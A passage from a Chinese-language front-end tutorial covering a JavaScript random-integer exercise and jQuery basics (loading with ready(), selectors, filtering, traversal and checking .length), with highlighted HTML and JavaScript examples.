class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>课堂练习</strong><br>制作一定范围内的随机整数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取10到20之间的随机整数</span></span><br><span class="line"><span class="keyword">var</span> iN01 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> iN02 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> result = <span class="built_in">Math</span>.floor((iN02 - iN01+<span class="number">1</span>)*<span class="built_in">Math</span>.random()) + iN01;</span><br><span class="line">alert(result)</span><br></pre></td></tr></table></figure><h1 id="10-JQuery"><a href="#10-JQuery" class="headerlink" title="10.JQuery"></a>10.JQuery</h1><h2 id="10-1-jquery介绍"><a href="#10-1-jquery介绍" class="headerlink" title="10.1 jquery介绍"></a>10.1 jquery介绍</h2><p>jQuery是目前使用最广泛的javascript函数库。据统计，全世界排名前100万的网站，有46%使用jQuery，远远超过其他库。微软公司甚至把jQuery作为他们的官方库。</p><p>jQuery的版本分为1.x系列和2.x、3.x系列，1.x系列兼容低版本的浏览器，2.x、3.x系列放弃支持低版本浏览器，目前使用最多的是1.x系列的。</p><p>jquery是一个函数库，一个js文件，页面用script标签引入这个js文件就可以使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-1.12.2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>jquery的口号和愿望 Write Less, Do More（写得少，做得多）</p><p>1、<a href="http://jquery.com/" target="_blank" rel="noopener">http://jquery.com/</a> 官方网站<br>2、<a href="https://code.jquery.com/" target="_blank" rel="noopener">https://code.jquery.com/</a> 版本下载</p><h2 id="10-2-jquery加载"><a href="#10-2-jquery加载" class="headerlink" title="10.2 jquery加载"></a>10.2 jquery加载</h2><p>将获取元素的语句写到页面头部，会因为元素还没有加载而出错，jquery提供了ready方法解决这个问题，它的速度比原生的 window.onload 更快。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">     ......</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>可以简写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">     ......</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 原生js写法,onload是整个页面加载完后，再渲染完之后才运行</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'这是原生js弹出的div'</span> + oDiv);</span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 完整写法，ready是标签加载完就执行，速度比原生js的快</span></span></span><br><span class="line"><span class="javascript">        $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div = $(<span class="string">"#div1"</span>);</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'这是jquery弹出的div-1'</span> + $div);</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 简单写法</span></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div = $(<span class="string">"#div1"</span>);</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'这是jquery弹出的div-2'</span> + $div);</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">    这是一个div元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-3-jquery选择器"><a href="#10-3-jquery选择器" class="headerlink" title="10.3 jquery选择器"></a>10.3 jquery选择器</h2><h3 id="10-3-1-jquery用法思想一"><a href="#10-3-1-jquery用法思想一" class="headerlink" title="10.3.1 jquery用法思想一"></a>10.3.1 <strong>jquery用法思想一</strong></h3><p>选择某个网页元素，然后对它进行某种操作</p><h3 id="10-3-2-jquery选择器"><a href="#10-3-2-jquery选择器" class="headerlink" title="10.3.2 jquery选择器"></a>10.3.2 <strong>jquery选择器</strong></h3><p>jquery选择器可以快速地选择元素，选择规则和css样式相同，使用length属性判断是否选择成功。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#myId'</span>) <span class="comment">//选择id为myId的网页元素</span></span><br><span class="line">$(<span class="string">'.myClass'</span>) <span class="comment">// 选择class为myClass的元素</span></span><br><span class="line">$(<span class="string">'li'</span>) <span class="comment">//选择所有的li元素</span></span><br><span class="line">$(<span class="string">'#ul1 li span'</span>) <span class="comment">//选择id为ul1元素下的所有li下的span元素</span></span><br><span class="line">$(<span class="string">'input[name=first]'</span>) <span class="comment">// 选择name属性等于first的input元素</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div = $(<span class="string">"#div1"</span>);</span></span><br><span class="line"><span class="javascript">            $div.css(&#123;<span class="string">"color"</span>:<span class="string">"red"</span>&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div2 = $(<span class="string">".box"</span>);</span></span><br><span class="line"><span class="javascript">            $div2.css(&#123;<span class="string">"color"</span>:<span class="string">"green"</span>&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $li = $(<span class="string">".list li"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 带'-'的样式属性可以写成驼峰式，也可以写成原始的，容错</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// $li.css(&#123;"backgroundColor":"pink"&#125;);</span></span></span><br><span class="line"><span class="javascript">            $li.css(&#123;<span class="string">"background-color"</span>:<span class="string">"pink"</span>&#125;);</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;style type="text/css"&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--#div1&#123;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--color: gold;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&#125;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--.box&#123;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--color: green;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&#125;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--.list li&#123;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--background-color: pink;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&#125;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;/style&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span>这是一个div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span>这是第二个div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span>这是第三个div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--ul.list&gt;li&#123;$&#125;*8--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>6<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>7<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>8<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-3-3对选择集进行过滤"><a href="#10-3-3对选择集进行过滤" class="headerlink" title="10.3.3对选择集进行过滤"></a>10.3.3<strong>对选择集进行过滤</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'div'</span>).has(<span class="string">'p'</span>); <span class="comment">// 选择包含p元素的div元素</span></span><br><span class="line">$(<span class="string">'div'</span>).not(<span class="string">'.myClass'</span>); <span class="comment">//选择class不等于myClass的div元素</span></span><br><span class="line">$(<span class="string">'div'</span>).filter(<span class="string">'.myClass'</span>); <span class="comment">//选择class等于myClass的div元素</span></span><br><span class="line">$(<span class="string">'div'</span>).eq(<span class="number">5</span>); <span class="comment">//选择第6个div元素</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// var $div = $("div");</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// $div.css(&#123;"background-color":"red"&#125;);</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $(<span class="string">"div"</span>).css(&#123;<span class="string">"background-color"</span>:<span class="string">"gold"</span>&#125;);</span></span><br><span class="line"><span class="javascript">            $(<span class="string">"div"</span>).has(<span class="string">'p'</span>).css(&#123;<span class="string">"background-color"</span>:<span class="string">"red"</span>&#125;);</span></span><br><span class="line"><span class="javascript">            $(<span class="string">"div"</span>).eq(<span class="number">4</span>).css(&#123;<span class="string">"text-indent"</span>:<span class="string">"30px"</span>&#125;);</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-3-4-选择集转移"><a href="#10-3-4-选择集转移" class="headerlink" title="10.3.4 选择集转移"></a>10.3.4 <strong>选择集转移</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'div'</span>).prev(); <span class="comment">//选择div元素前面紧挨的同辈元素</span></span><br><span class="line">$(<span class="string">'div'</span>).prevAll(); <span class="comment">//选择div元素之前所有的同辈元素</span></span><br><span class="line">$(<span class="string">'div'</span>).next(); <span class="comment">//选择div元素后面紧挨的同辈元素</span></span><br><span class="line">$(<span class="string">'div'</span>).nextAll(); <span class="comment">//选择div元素后面所有的同辈元素</span></span><br><span class="line">$(<span class="string">'div'</span>).parent(); <span class="comment">//选择div的父元素</span></span><br><span class="line">$(<span class="string">'div'</span>).children(); <span class="comment">//选择div的所有子元素</span></span><br><span class="line">$(<span class="string">'div'</span>).siblings(); <span class="comment">//选择div的同级元素</span></span><br><span class="line">$(<span class="string">'div'</span>).find(<span class="string">'.myClass'</span>); <span class="comment">//选择div内的class等于myClass的元素</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">"div"</span>).eq(<span class="number">4</span>).prev().css(&#123;<span class="string">"color"</span>:<span class="string">"green"</span>&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $(<span class="string">"div"</span>).find(<span class="string">".tip"</span>).css(&#123;<span class="string">"color"</span>:<span class="string">"red"</span>&#125;);</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>8<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-3-5-判断是否选择到了元素"><a href="#10-3-5-判断是否选择到了元素" class="headerlink" title="10.3.5 判断是否选择到了元素"></a>10.3.5 <strong>判断是否选择到了元素</strong></h3><p>jquery有容错机制，即使没有找到元素，也不会出错，可以用length属性来判断是否找到了元素,length等于0，就是没选择到元素，length大于0，就是选择到了元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div1 = $(<span class="string">'#div1'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 没有选中元素，也不会报错，程序正常运行</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div2 = $(<span class="string">'#div2'</span>);</span></span><br><span class="line"><span class="javascript">            alert($div1.length); <span class="comment">// 弹出1</span></span></span><br><span class="line"><span class="javascript">            alert($div2.length); <span class="comment">// 弹出0</span></span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span 